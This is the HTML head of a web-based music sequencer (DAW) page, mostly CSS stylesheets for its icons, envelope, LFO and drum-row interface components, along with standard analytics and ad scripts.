
<!DOCTYPE html>
<html lang="en">
<head>
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="HandheldFriendly" content="true">
<meta name="MobileOptimized" content="width">
<link rel="apple-touch-icon" sizes="96x96" href="/assets/icon/black/96.png">
<link rel="apple-touch-icon" sizes="128x128" href="/assets/icon/black/128.png">
<link rel="apple-touch-icon" href="/assets/icon/black/96.png">
<link rel="apple-touch-startup-image" href="//assets/icon/black/512.png">
<iframe data-aa="1529791" src="//acceptable.a-ads.com/1529791" scrolling="no" style="border:0px; padding:0; width:100%; height:100%; overflow:hidden" allowtransparency="true"></iframe>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Y9GXFP1S3C"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-Y9GXFP1S3C');
</script>

<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-M2VH8NR');</script>
<!-- End Google Tag Manager -->

<script data-ad-client="ca-pub-9978497384789328" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<title>squencer.netlify.app</title>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, user-scalable=no"/>
<meta property="fb:pages" content="231746696898706" />
<meta name="description" content="A free and Open-Source DAW (digital audio workstation)"/>
<meta name="google" content="notranslate"/>
<meta property="og:type" content="website"/>
<meta property="og:title" content="squencer.netlify.app"/>
<meta property="og:image" content="https://squencer.netlify.app/assets/og-image.jpg"/>
<meta property="og:image:width" content="800"/>
<meta property="og:image:height" content="400"/>
<meta property="og:description" content="a free and open source DAW (digital audio workstation)"/>
<meta name="theme-color" content="#8AC0D1"/>
<link rel="manifest" href="manifest.json"/>
<link rel="shortcut icon" href="../assets/favicon.png"/>
<style>
.gsuiDragshield {
	position: absolute;
	z-index: 2147483647;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	pointer-events: none;
}
.gsuiDragshield-show {
	pointer-events: auto;
}
:root {
	--gsuiIcon-color-after: currentColor;
	--gsuiIcon-opacity-after: .6;
}

/* .......................................................................... */
.gsuiIcon {
	position: relative;
	display: inline-block;
	font-family: "FontAwesome";
	font-size: 1em;
	font-style: normal;
	font-weight: normal;
	font-variant: normal;
	text-rendering: auto;
	-moz-osx-font-smoothing: grayscale;
	-webkit-font-smoothing: antialiased;
}
.gsuiIconB {
	font-family: "FontAwesomeBrands";
}
.gsuiIcon::before {
	pointer-events: none;
}
.gsuiIcon:not( .gsuiIconB )::before {
	position: absolute;
}
.gsuiIcon::after {
	color: var( --gsuiIcon-color-after );
	opacity: var( --gsuiIcon-opacity-after );
	pointer-events: none;
}
.gsuiIcon:not( [ data-spin="on" ] )[ data-icon="" ],
.gsuiIcon:not( [ data-spin="on" ] ):not( [ data-icon ] ),
.gsuiIconB::after {
	display: none;
}

/* .......................................................................... */
.gsuiIcon.gsuiIcon.gsuiIcon[ data-spin="on" ] {
	line-height: 1;
}
.gsuiIcon.gsuiIcon.gsuiIcon[ data-spin="on" ]::before {
	content: "\f3f4";
	animation: .7s infinite linear gsuiIcon-spin;
	opacity: 1;
}
.gsuiIcon.gsuiIcon.gsuiIcon[ data-spin="on" ]::after {
	display: inline-block;
	content: "\10f3f4";
	animation: .7s infinite linear gsuiIcon-spin;
	opacity: .4;
}

@keyframes gsuiIcon-spin {
	from { transform: rotate( 0deg ); }
	to { transform: rotate( 360deg ); }
}

/* .......................................................................... */
.gsuiIcon[ data-icon="github" ]::before { content: "\f09b"; }
.gsuiIcon[ data-icon="github" ]::after { content: "\10f09b"; }
.gsuiIcon[ data-icon="github" ]:hover::before { content: "\f113"; }
.gsuiIcon[ data-icon="github" ]:hover::after { content: "\10f113"; }
.gsuiIcon[ data-icon="codepen" ]::before { content: "\f1cb"; }
.gsuiIcon[ data-icon="codepen" ]::after { content: "\10f1cb"; }
.gsuiIcon[ data-icon="discord" ]::before { content: "\f392"; }
.gsuiIcon[ data-icon="discord" ]::after { content: "\10f392"; }
.gsuiIcon[ data-icon="patreon" ]::before { content: "\f3d9"; }
.gsuiIcon[ data-icon="patreon" ]::after { content: "\10f3d9"; }
.gsuiIcon[ data-icon="twitter" ]::before { content: "\f099"; }
.gsuiIcon[ data-icon="twitter" ]::after { content: "\10f099"; }
.gsuiIcon[ data-icon="youtube" ]::before { content: "\f167"; }
.gsuiIcon[ data-icon="youtube" ]::after { content: "\10f167"; }
.gsuiIcon[ data-icon="facebook" ]::before { content: "\f09a"; }
.gsuiIcon[ data-icon="facebook" ]::after { content: "\10f09a"; }
.gsuiIcon[ data-icon="wordpress" ]::before { content: "\f411"; }
.gsuiIcon[ data-icon="wordpress" ]::after { content: "\10f411"; }

/* .......................................................................... */
.gsuiIcon[ data-icon="arrow-left" ]::before { content: "\f355"; }
.gsuiIcon[ data-icon="arrow-left" ]::after { content: "\10f355"; }
.gsuiIcon[ data-icon="arrow-right" ]::before { content: "\f356"; }
.gsuiIcon[ data-icon="arrow-right" ]::after { content: "\10f356"; }
.gsuiIcon[ data-icon="arrows" ]::before { content: "\f0b2"; }
.gsuiIcon[ data-icon="arrows" ]::after { content: "\10f0b2"; }
.gsuiIcon[ data-icon="arrows-v" ]::before { content: "\f338"; }
.gsuiIcon[ data-icon="arrows-v" ]::after { content: "\10f338"; }
.gsuiIcon[ data-icon="arrows-h" ]::before { content: "\f337"; }
.gsuiIcon[ data-icon="arrows-h" ]::after { content: "\10f337"; }
.gsuiIcon[ data-icon="arrow-dropdown" ]::before { content: "\f34a"; }
.gsuiIcon[ data-icon="arrow-dropdown" ]::after { content: "\10f34a"; }

.gsuiIcon[ data-icon="sort" ]::before { content: "\f0dc"; }
.gsuiIcon[ data-icon="sort" ]::after { content: "\10f0dc"; }
.gsuiIcon[ data-icon="caret-up" ]::before { content: "\f0d8"; }
.gsuiIcon[ data-icon="caret-up" ]::after { content: "\10f0d8"; }
.gsuiIcon[ data-icon="caret-down" ]::before { content: "\f0d7"; }
.gsuiIcon[ data-icon="caret-down" ]::after { content: "\10f0d7"; }
.gsuiIcon[ data-icon="caret-left" ]::before { content: "\f0d9"; }
.gsuiIcon[ data-icon="caret-left" ]::after { content: "\10f0d9"; }
.gsuiIcon[ data-icon="caret-right" ]::before { content: "\f0da"; }
.gsuiIcon[ data-icon="caret-right" ]::after { content: "\10f0da"; }

.gsuiIcon[ data-icon="osc-sine" ]::before { content: "\f899"; }
.gsuiIcon[ data-icon="osc-sine" ]::after { content: "\10f899"; }
.gsuiIcon[ data-icon="osc-triangle" ]::before { content: "\f89a"; }
.gsuiIcon[ data-icon="osc-triangle" ]::after { content: "\10f89a"; }
.gsuiIcon[ data-icon="osc-square" ]::before { content: "\f83e"; }
.gsuiIcon[ data-icon="osc-square" ]::after { content: "\10f83e"; }

.gsuiIcon[ data-icon="undo" ]::before { content: "\f2ea"; }
.gsuiIcon[ data-icon="undo" ]::after { content: "\10f2ea"; }
.gsuiIcon[ data-icon="redo" ]::before { content: "\f2f9"; }
.gsuiIcon[ data-icon="redo" ]::after { content: "\10f2f9"; }
.gsuiIcon[ data-icon="undo" ]:hover::before { content: "\f0e2"; }
.gsuiIcon[ data-icon="undo" ]:hover::after { content: "\10f0e2"; }
.gsuiIcon[ data-icon="redo" ]:hover::before { content: "\f01e"; }
.gsuiIcon[ data-icon="redo" ]:hover::after { content: "\10f01e"; }

.gsuiIcon[ data-icon="play" ]::before { content: "\f04b"; opacity: .6; }
.gsuiIcon[ data-icon="play" ]::after { content: "\10f04b"; opacity: 1; }
.gsuiIcon[ data-icon="stop" ]::before { content: "\f04d"; opacity: .6; }
.gsuiIcon[ data-icon="stop" ]::after { content: "\10f04d"; opacity: 1; }
.gsuiIcon[ data-icon="loop" ]::before { content: "\f364"; }
.gsuiIcon[ data-icon="loop" ]::after { content: "\10f364"; }
.gsuiIcon[ data-icon="pause" ]::before { content: "\f04c"; opacity: .6; }
.gsuiIcon[ data-icon="pause" ]::after { content: "\10f04c"; opacity: 1; }
.gsuiIcon[ data-icon="eject" ]::before { content: "\f052"; }
.gsuiIcon[ data-icon="eject" ]::after { content: "\10f052"; }
.gsuiIcon[ data-icon="toggle" ]::before { content: "\f111"; opacity: .6; }
.gsuiIcon[ data-icon="toggle" ]::after { content: "\10f111"; opacity: 1; }

.gsuiIcon[ data-icon="circle" ]::before { content: "\f111"; opacity: .6; }
.gsuiIcon[ data-icon="circle" ]::after { content: "\10f111"; opacity: 1; }
.gsuiIcon[ data-icon="square" ]::before { content: "\f0c8"; opacity: .6; }
.gsuiIcon[ data-icon="square" ]::after { content: "\10f0c8"; opacity: 1; }
.gsuiIcon[ data-icon="triangle" ]::before { content: "\f2ec"; opacity: .6; }
.gsuiIcon[ data-icon="triangle" ]::after { content: "\10f2ec"; opacity: 1; }
.gsuiIcon[ data-icon="diamond" ]::before { content: "\f219"; opacity: .6; }
.gsuiIcon[ data-icon="diamond" ]::after { content: "\10f219"; opacity: 1; }
.gsuiIcon[ data-icon="heart" ]::before { content: "\f004"; opacity: .6; }
.gsuiIcon[ data-icon="heart" ]::after { content: "\10f004"; opacity: 1; }
.gsuiIcon[ data-icon="hexagon" ]::before { content: "\f312"; opacity: .6; }
.gsuiIcon[ data-icon="hexagon" ]::after { content: "\10f312"; opacity: 1; }
.gsuiIcon[ data-icon="octagon" ]::before { content: "\f306"; opacity: .6; }
.gsuiIcon[ data-icon="octagon" ]::after { content: "\10f306"; opacity: 1; }

.gsuiIcon[ data-icon="mute" ]::before { content: "\f2e2"; }
.gsuiIcon[ data-icon="mute" ]::after { content: "\10f2e2"; }
.gsuiIcon[ data-icon="unmute" ]::before { content: "\f028"; }
.gsuiIcon[ data-icon="unmute" ]::after { content: "\10f028"; }

.gsuiIcon[ data-icon="close" ]::before { content: "\f00d"; font-size: 1.15em; }
.gsuiIcon[ data-icon="close" ]::after { content: "\10f00d"; font-size: 1.15em; }
.gsuiIcon[ data-icon="restore" ]::before { content: "\f2d2"; }
.gsuiIcon[ data-icon="restore" ]::after { content: "\10f2d2"; }
.gsuiIcon[ data-icon="minimize" ]::before { content: "\f2d1"; }
.gsuiIcon[ data-icon="minimize" ]::after { content: "\10f2d1"; opacity: 1; }
.gsuiIcon[ data-icon="maximize" ]::before { content: "\f2d0"; }
.gsuiIcon[ data-icon="maximize" ]::after { content: "\10f2d0"; opacity: 0; }

.gsuiIcon[ data-icon="save" ]::before { content: "\f0c7"; }
.gsuiIcon[ data-icon="save" ]::after { content: "\10f0c7"; opacity: .4; }
.gsuiIcon[ data-icon="render" ]::before { content: "\f0e7"; }
.gsuiIcon[ data-icon="render" ]::after { content: "\10f0e7"; }
.gsuiIcon[ data-icon="upload" ]::before { content: "\f382"; opacity: 0; }
.gsuiIcon[ data-icon="upload" ]::after { content: "\10f382"; opacity: 1; }
.gsuiIcon[ data-icon="upload" ]:hover::before { content: "\f0ee"; opacity: 0; }
.gsuiIcon[ data-icon="upload" ]:hover::after { content: "\10f0ee"; opacity: 1; }
.gsuiIcon[ data-icon="export" ]::before { content: "\f019"; }
.gsuiIcon[ data-icon="export" ]::after { content: "\10f019"; }
.gsuiIcon[ data-icon="folder-open" ]::before { content: "\f07c"; }
.gsuiIcon[ data-icon="folder-open" ]::after { content: "\10f07c"; }
.gsuiIcon[ data-icon="folder-tree" ]::before { content: "\f802"; }
.gsuiIcon[ data-icon="folder-tree" ]::after { content: "\10f802"; }
.gsuiIcon[ data-icon="file-export" ]::before { content: "\f56e"; }
.gsuiIcon[ data-icon="file-export" ]::after { content: "\10f56e"; }
.gsuiIcon[ data-icon="file-corrupt" ]::before { content: "\f877"; }
.gsuiIcon[ data-icon="file-corrupt" ]::after { content: "\10f877"; }

.gsuiIcon[ data-icon="login" ]::before { content: "\f090"; }
.gsuiIcon[ data-icon="login" ]::after { content: "\10f090"; }
.gsuiIcon[ data-icon="login" ]:hover::before { content: "\f2f6"; }
.gsuiIcon[ data-icon="login" ]:hover::after { content: "\10f2f6"; }
.gsuiIcon[ data-icon="logout" ]::before { content: "\f08b"; }
.gsuiIcon[ data-icon="logout" ]::after { content: "\10f08b"; }
.gsuiIcon[ data-icon="logout" ]:hover::before { content: "\f2f5"; }
.gsuiIcon[ data-icon="logout" ]:hover::after { content: "\10f2f5"; }
.gsuiIcon[ data-icon="profile" ]::before { content: "\f2bd"; }
.gsuiIcon[ data-icon="profile" ]::after { content: "\10f2bd"; }
.gsuiIcon[ data-icon="musician" ]::before { content: "\f8eb"; }
.gsuiIcon[ data-icon="musician" ]::after { content: "\10f8eb"; }

.gsuiIcon[ data-icon="speed" ]::before { content: "\f625"; opacity: 0; }
.gsuiIcon[ data-icon="speed" ]::after { content: "\10f625"; opacity: 1; }
.gsuiIcon[ data-icon="clock" ]::before { content: "\f017"; }
.gsuiIcon[ data-icon="clock" ]::after { content: "\10f017"; opacity: .3; }
.gsuiIcon[ data-icon="history" ]::before { content: "\f1da"; }
.gsuiIcon[ data-icon="history" ]::after { content: "\10f1da"; }

.gsuiIcon[ data-icon="keys" ]::before { content: "\f8d5"; }
.gsuiIcon[ data-icon="keys" ]::after { content: "\10f8d5"; }
.gsuiIcon[ data-icon="drums" ]::before { content: "\f2a1"; }
.gsuiIcon[ data-icon="drums" ]::after { content: "\10f2a1"; }
.gsuiIcon[ data-icon="mixer" ]::before { content: "\f3f1"; }
.gsuiIcon[ data-icon="mixer" ]::after { content: "\10f3f1"; }
.gsuiIcon[ data-icon="music" ]::before { content: "\f001"; }
.gsuiIcon[ data-icon="music" ]::after { content: "\10f001"; }
.gsuiIcon[ data-icon="musics" ]::before { content: "\f8c9"; }
.gsuiIcon[ data-icon="musics" ]::after { content: "\10f8c9"; }
.gsuiIcon[ data-icon="effects" ]::before { content: "\f5fd"; }
.gsuiIcon[ data-icon="effects" ]::after { content: "\10f5fd"; }
.gsuiIcon[ data-icon="waveform" ]::before { content: "\f8f2"; }
.gsuiIcon[ data-icon="waveform" ]::after { content: "\10f8f2"; }
.gsuiIcon[ data-icon="oscillator" ]::before { content: "\f83e"; }
.gsuiIcon[ data-icon="oscillator" ]::after { content: "\10f83e"; opacity: 1; }
.gsuiIcon[ data-icon="glissando" ]::before { content: "\f667"; }
.gsuiIcon[ data-icon="glissando" ]::after { content: "\10f667"; }

.gsuiIcon[ data-icon="plus" ]::before { content: "\f067"; }
.gsuiIcon[ data-icon="plus" ]::after { content: "\10f067"; opacity: .7; }
.gsuiIcon[ data-icon="minus" ]::before { content: "\f068"; }
.gsuiIcon[ data-icon="minus" ]::after { content: "\10f068"; opacity: 1; }
.gsuiIcon[ data-icon="minus-oct" ]::before { content: "\f308"; }
.gsuiIcon[ data-icon="minus-oct" ]::after { content: "\10f308"; }

.gsuiIcon[ data-icon="check" ]::before { content: "\f00c"; }
.gsuiIcon[ data-icon="check" ]::after { content: "\10f00c"; }
.gsuiIcon[ data-icon="warning" ]::before { content: "\f071"; }
.gsuiIcon[ data-icon="warning" ]::after { content: "\10f071"; }
.gsuiIcon[ data-icon="redirect" ]::before { content: "\f5eb"; }
.gsuiIcon[ data-icon="redirect" ]::after { content: "\10f5eb"; opacity: .4; }

.gsuiIcon[ data-icon="pen" ]::before { content: "\f304"; }
.gsuiIcon[ data-icon="pen" ]::after { content: "\10f304"; }
.gsuiIcon[ data-icon="crop" ]::before { content: "\f125"; }
.gsuiIcon[ data-icon="crop" ]::after { content: "\10f125"; }
.gsuiIcon[ data-icon="erase" ]::before { content: "\f12d"; }
.gsuiIcon[ data-icon="erase" ]::after { content: "\10f12d"; }
.gsuiIcon[ data-icon="list" ]::before { content: "\f0ca"; }
.gsuiIcon[ data-icon="list" ]::after { content: "\10f0ca"; }

.gsuiIcon[ data-icon="local" ]::before { content: "\f8e6"; }
.gsuiIcon[ data-icon="local" ]::after { content: "\10f8e6"; opacity: .2; }
.gsuiIcon[ data-icon="cloud" ]::before { content: "\f8ae"; opacity: .2; }
.gsuiIcon[ data-icon="cloud" ]::after { content: "\10f8ae"; opacity: 1; }

.gsuiIcon[ data-icon="cookie" ]::before { content: "\f563"; }
.gsuiIcon[ data-icon="cookie" ]::after { content: "\10f563"; }
.gsuiIcon[ data-icon="cookie" ]:hover::before { content: "\f564"; }
.gsuiIcon[ data-icon="cookie" ]:hover::after { content: "\10f564"; }

.gsuiIcon[ data-icon="link" ]::before { content: "\f0c1"; }
.gsuiIcon[ data-icon="link" ]::after { content: "\10f0c1"; }
.gsuiIcon[ data-icon="unlink" ]::before { content: "\f127"; }
.gsuiIcon[ data-icon="unlink" ]::after { content: "\10f127"; }

.gsuiIcon[ data-icon="public" ]::before { content: "\f7a2"; }
.gsuiIcon[ data-icon="public" ]::after { content: "\10f7a2"; opacity: .4; }
.gsuiIcon[ data-icon="private" ]::before { content: "\f30d"; }
.gsuiIcon[ data-icon="private" ]::after { content: "\10f30d"; }

.gsuiIcon[ data-icon="grip-h" ]::before { content: "\f58d"; }
.gsuiIcon[ data-icon="grip-h" ]::after { content: "\10f58d"; }
.gsuiIcon[ data-icon="grip-v" ]::before { content: "\f58e"; }
.gsuiIcon[ data-icon="grip-v" ]::after { content: "\10f58e"; }

.gsuiIcon[ data-icon="clone" ]::before { content: "\f24d"; }
.gsuiIcon[ data-icon="clone" ]::after { content: "\10f24d"; }

.gsuiIcon[ data-icon="drumcut" ] { transform: rotate( 90deg ); }
.gsuiIcon[ data-icon="drumcut" ]::before { content: "\f052"; }
.gsuiIcon[ data-icon="drumcut" ]::after { content: "\10f052"; }
.gsuiIcon[ data-icon="drumprops" ] { transform: rotate( -90deg ); }
.gsuiIcon[ data-icon="drumprops" ]::before { content: "\f884"; }
.gsuiIcon[ data-icon="drumprops" ]::after { content: "\10f884"; }

.gsuiIcon[ data-icon="smiley" ]::before { content: "\f581"; opacity: 0; }
.gsuiIcon[ data-icon="smiley" ]::after { content: "\10f581"; opacity: 1; }

.gsuiIcon[ data-icon="bug" ]::before { content: "\f188"; }
.gsuiIcon[ data-icon="bug" ]::after { content: "\10f188"; }

.gsuiIcon[ data-icon="mouse" ]::before { content: "\f245"; }
.gsuiIcon[ data-icon="mouse" ]::after { content: "\10f245"; opacity: 1; }

.gsuiIcon[ data-icon="magnet" ]::before { content: "\f076"; }
.gsuiIcon[ data-icon="magnet" ]::after { content: "\10f076"; }

.gsuiIcon[ data-icon="tint" ]::before { content: "\f043"; }
.gsuiIcon[ data-icon="tint" ]::after { content: "\10f043"; }

.gsuiIcon[ data-icon="settings" ]::before { content: "\f013"; }
.gsuiIcon[ data-icon="settings" ]::after { content: "\10f013"; }
.gsuiIcon[ data-icon="help" ]::before { content: "\f0fa"; }
.gsuiIcon[ data-icon="help" ]::after { content: "\10f0fa"; }
.gsuiIcon[ data-icon="changelog" ]::before { content: "\f70e"; }
.gsuiIcon[ data-icon="changelog" ]::after { content: "\10f70e"; }
.gsuiIcon[ data-icon="about" ]::before { content: "\f30e"; }
.gsuiIcon[ data-icon="about" ]::after { content: "\10f30e"; }

.gsuiIcon[ data-icon="rocket" ]::before { content: "\f135"; }
.gsuiIcon[ data-icon="rocket" ]::after { content: "\10f135"; }

.gsuiIcon[ data-icon="keyboard" ]::before { content: "\f11c"; }
.gsuiIcon[ data-icon="keyboard" ]::after { content: "\10f11c"; }
.gsuiEnvelope {
	--gsuiEnvelope-bg: #666;
	--gsuiEnvelope-txt: #fff;
	--gsuiEnvelope-head-bg: #111738;
	--gsuiEnvelope-wave-bg: #0004;
	--gsuiEnvelope-wave-off: #777;
	--gsuiEnvelope-ctrls-bg: #555;
	--gsuiEnvelope-ctrls-color: #ff9;
	--gsuiEnvelope-toggle-off: #fff3;
}
.gsuiEnvelope {
	display: grid;
	height: 100%;
	box-sizing: border-box;
	grid-gap: 6px;
	grid-template:
		"head head   head  head  head     head    head" 24px
		".    attack hold  decay substain release .   " 28px
		".    graph  graph graph graph    graph   .   " 1fr
		".    .      .     .     .        .       .   " 0
		/0    1fr    1fr   1fr   1fr      1fr     0;
	color: var( --gsuiEnvelope-txt );
	font-family: var( --gsui-font );
	background-color: var( --gsuiEnvelope-bg );
	--gsuiSlider-lineColor: var( --gsuiEnvelope-ctrls-color );
	--gsuiSlider-lineBgColor: var( --gsuiEnvelope-ctrls-bg );
}

/* .......................................................................... */
.gsuiEnvelope-prop {
	display: flex;
	flex-direction: column;
}
.gsuiEnvelope-propLabel {
	display: flex;
	align-self: center;
	align-items: baseline;
	height: 20px;
	font-size: 12px;
	opacity: .5;
	user-select: none;
}
.gsuiEnvelope-propValue::before {
	content: "?";
	margin: 0 2px;
}
.gsuiEnvelope-propValue {
	font-family: var( --gsui-font-number );
}
.gsuiEnvelope-propContent {
	flex: 1;
	position: relative;
}

/* .......................................................................... */
.gsuiEnvelope-attack {
	grid-area: attack;
}
.gsuiEnvelope-hold {
	grid-area: hold;
}
.gsuiEnvelope-decay {
	grid-area: decay;
}
.gsuiEnvelope-substain {
	grid-area: substain;
}
.gsuiEnvelope-release {
	grid-area: release;
}
.gsuiEnvelope .gsuiSlider-eventCatcher {
	top: -26px;
	bottom: -6px;
}

/* .......................................................................... */
.gsuiEnvelope-head {
	grid-area: head;
	display: flex;
	align-items: center;
	background-color: var( --gsuiEnvelope-head-bg );
	user-select: none;
}
.gsuiEnvelope-title {
	font-size: 14px;
	opacity: .3;
}
.gsuiEnvelope-toggle {
	display: flex;
	align-items: center;
	justify-content: center;
	align-self: normal;
	border: 0;
	margin: 0;
	outline: 0;
	padding: 0;
	width: 24px;
	color: var( --gsuiEnvelope-toggle-off );
	font-size: 8px;
	cursor: pointer;
	background: none;
	transition: .2s color;
}
.gsuiEnvelope-enable .gsuiEnvelope-toggle {
	color: var( --gsuiEnvelope-ctrls-color );
}
.gsuiEnvelope-toggleCheckbox {
	display: none;
}

/* .......................................................................... */
.gsuiEnvelope-graph {
	grid-area: graph;
	position: relative;
	overflow: hidden;
	border-radius: 4px;
	background-color: var( --gsuiEnvelope-wave-bg );
}
.gsuiEnvelope-graph svg {
	position: absolute;
	/*top: 6px;*/
	/*height: calc( 100% - 12px );*/
	color: var( --gsuiEnvelope-wave-off );
	stroke-width: 2px;
	transition: color .2s;
}
.gsuiEnvelope-enable svg {
	color: var( --gsuiEnvelope-ctrls-color );
}
.gsuiLFO {
	--gsuiLFO-bg: #666;
	--gsuiLFO-txt: #fff;
	--gsuiLFO-head-bg: #111738;
	--gsuiLFO-wave-bg: #0004;
	--gsuiLFO-wave-off: #777;
	--gsuiLFO-ctrls-bg: #555;
	--gsuiLFO-ctrls-color: #ff9;
	--gsuiLFO-toggle-off: #fff3;
}
.gsuiLFO {
	display: grid;
	height: 100%;
	box-sizing: border-box;
	grid-gap: 6px;
	grid-template:
		"head head head  head   head  head  head" 24px
		".    type delay attack speed amp   .   " 28px
		".    type graph graph  graph graph .   " 1fr
		".    .    .     .      .     .     .   " 0
		/0    32px 1fr   1fr    1fr   1fr   0;
	color: var( --gsuiLFO-txt );
	font-family: var( --gsui-font );
	background-color: var( --gsuiLFO-bg );
	--gsuiSlider-lineColor: var( --gsuiLFO-ctrls-color );
	--gsuiSlider-lineBgColor: var( --gsuiLFO-ctrls-bg );
}

/* .......................................................................... */
.gsuiLFO-prop {
	display: flex;
	flex-direction: column;
}
.gsuiLFO-propLabel {
	display: flex;
	align-self: center;
	align-items: baseline;
	height: 20px;
	font-size: 12px;
	opacity: .5;
	user-select: none;
}
.gsuiLFO-propValue::before {
	content: "?";
	margin: 0 2px;
}
.gsuiLFO-propValue {
	font-family: var( --gsui-font-number );
}
.gsuiLFO-propContent {
	flex: 1;
	position: relative;
}

/* .......................................................................... */
.gsuiLFO-btn {
	position: relative;
	cursor: pointer;
}
.gsuiLFO-btnInput {
	position: absolute;
	visibility: hidden;
}
.gsuiLFO-btnIcon {
	position: absolute;
	top: 0;
	left: 0;
	display: flex;
	align-items: center;
	justify-content: center;
	width: 100%;
	height: 100%;
	background-color: var( --gsuiLFO-ctrls-bg );
}

/* .......................................................................... */
.gsuiLFO-delay {
	grid-area: delay;
}
.gsuiLFO-attack {
	grid-area: attack;
}
.gsuiLFO-amp {
	grid-area: amp;
}
.gsuiLFO-speed {
	grid-area: speed;
}
.gsuiLFO .gsuiSlider-eventCatcher {
	top: -26px;
	bottom: -6px;
}

/* .......................................................................... */
.gsuiLFO-head {
	grid-area: head;
	display: flex;
	align-items: center;
	background-color: var( --gsuiLFO-head-bg );
	user-select: none;
}
.gsuiLFO-title {
	font-size: 14px;
	opacity: .3;
}
.gsuiLFO-toggle {
	align-self: normal;
	border: 0;
	margin: 0;
	outline: 0;
	padding: 0;
	width: 24px;
	color: var( --gsuiLFO-toggle-off );
	font-size: 8px;
	background: none;
	transition: .2s color;
}
.gsuiLFO-enable .gsuiLFO-toggle {
	color: var( --gsuiLFO-ctrls-color );
}

/* .......................................................................... */
.gsuiLFO-graph {
	grid-area: graph;
	position: relative;
	overflow: hidden;
	border-radius: 4px;
	background-color: var( --gsuiLFO-wave-bg );
}
.gsuiLFO-ampSigns {
	position: absolute;
	display: flex;
	flex-direction: column;
	top: 0;
	left: 0;
	bottom: 0;
	width: 10px;
}
.gsuiLFO-ampSign {
	flex: 1;
}
.gsuiLFO-enable .gsuiLFO-ampSign {
	color: var( --gsuiLFO-ctrls-color );
}
.gsuiLFO-ampSignIcon {
	color: var( --gsuiLFO-wave-off );
	font-size: 11px;
}
.gsuiLFO-enable .gsuiLFO-ampSignIcon {
	color: var( --gsuiLFO-ctrls-color );
}
.gsuiLFO-ampSignRadio:checked + .gsuiLFO-ampSignIcon {
	color: var( --gsuiLFO-ctrls-bg );
	background-color: var( --gsuiLFO-wave-off );
}
.gsuiLFO-enable .gsuiLFO-ampSignRadio:checked + .gsuiLFO-ampSignIcon {
	background-color: var( --gsuiLFO-ctrls-color );
}
.gsuiLFO-wave {
	position: absolute;
	top: 0;
	left: 8px;
	right: -2px;
	bottom: 0;
	pointer-events: none;
}
.gsuiLFO-wave .gsuiPeriodicWave {
	position: absolute;
	top: 6px;
	height: calc( 100% - 12px );
	color: var( --gsuiLFO-wave-off );
	stroke-width: 2px;
	transition: color .2s;
}
.gsuiLFO-enable .gsuiPeriodicWave {
	color: var( --gsuiLFO-ctrls-color );
}

/* .......................................................................... */
.gsuiLFO-type {
	grid-area: type;
}
.gsuiLFO-type .gsuiLFO-propContent {
	display: flex;
	overflow: hidden;
	border-radius: 4px;
	flex-direction: column;
}
.gsuiLFO-typeBtn {
	flex: 1;
}
.gsuiLFO-typeSVG {
	fill: none;
	stroke: var( --gsuiLFO-wave-off );
	stroke-width: 2px;
	background-color: var( --gsuiLFO-ctrls-bg );
	transition: .2s;
	transition-property: stroke, background-color;
}
.gsuiLFO-enable .gsuiLFO-typeSVG {
	stroke: var( --gsuiLFO-ctrls-color );
}
.gsuiLFO-typeSVG path {
	transform: scale( .6 );
	transform-origin: center;
}
.gsuiLFO-typeRadio:checked + .gsuiLFO-typeSVG {
	stroke: var( --gsuiLFO-ctrls-bg );
	background-color: var( --gsuiLFO-wave-off );
}
.gsuiLFO-enable .gsuiLFO-typeRadio:checked + .gsuiLFO-typeSVG {
	background-color: var( --gsuiLFO-ctrls-color );
}
:root {
	--gsuiDrumrow-bg: #555;
	--gsuiDrumrow-slider-bg: #444;
	--gsuiDrumrow-pan: #d9f;
	--gsuiDrumrow-gain: #ff9;
	--gsuiDrumrow-detune: #fff;
	--gsuiDrumrow-border: #0002;
	--gsuiDrumrow-color: #fff;
	--gsuiDrumrow-grip-bg: #0001;
	--gsuiDrumrow-toggle-bg: #ffa;
	--gsuiDrumrow-toggleOff-bg: #fff3;
	--gsuiDrumrow-prop-bgHover: #fff2;
}
.gsuiDrumrows {
	display: flex;
	flex-direction: column;
	font-size: var( --gsuiTimewindow-lineH );
}
.gsuiDrumrows::-webkit-scrollbar {
	display: none;
}

/* .......................................................................... */
.gsuiDrumrows-drop {
	display: none;
	height: 1em;
	order: 1;
	align-items: center;
	justify-content: center;
	pointer-events: none;
}
.gsuiDrumrows-dragover > .gsuiDrumrows-drop {
	display: flex;
}
.gsuiDrumrows-dropIn {
	font-size: 24px;
	opacity: .5;
}

/* .......................................................................... */
.gsuiDrumrow {
	--grip-w: 16px;
	--toggle-w: 20px;
	--name-h: 16px;
	--propsExpand-w: 16px;
	--delete-w: 14px;
	--slider-w: 7px;
	--props-h: 1.5em;
	position: relative;
	box-sizing: border-box;
	height: calc( 1em + 1px );
	min-height: calc( 1em + 1px );
	margin-top: -1px;
	border: 0 solid var( --gsuiDrumrow-border );
	border-width: 1px 0;
	background-color: var( --gsuiDrumrow-bg );
	transition: .2s height, .2s min-height, .1s filter;
}
.gsuiDrumrow-mute {
	--gsuiDrumrow-toggle-bg: var( --gsuiDrumrow-toggleOff-bg );
	filter: brightness( .8 ) contrast( .8 );
}
.gsuiDrumrow-open {
	height: calc( 1em + 1px + var( --props-h ) );
	min-height: calc( 1em + 1px + var( --props-h ) );
}

/* .......................................................................... */
.gsuiDrumrow-main {
	position: absolute;
	box-sizing: border-box;
	top: 0;
	left: var( --grip-w );
	right: 0;
	height: 1em;
	min-height: 1em;
	border-bottom: 1px dashed var( --gsuiDrumrow-border );
}
.gsuiDrumrow-props {
	position: absolute;
	overflow: hidden;
	display: flex;
	align-items: center;
	justify-content: center;
	top: 1em;
	left: var( --grip-w );
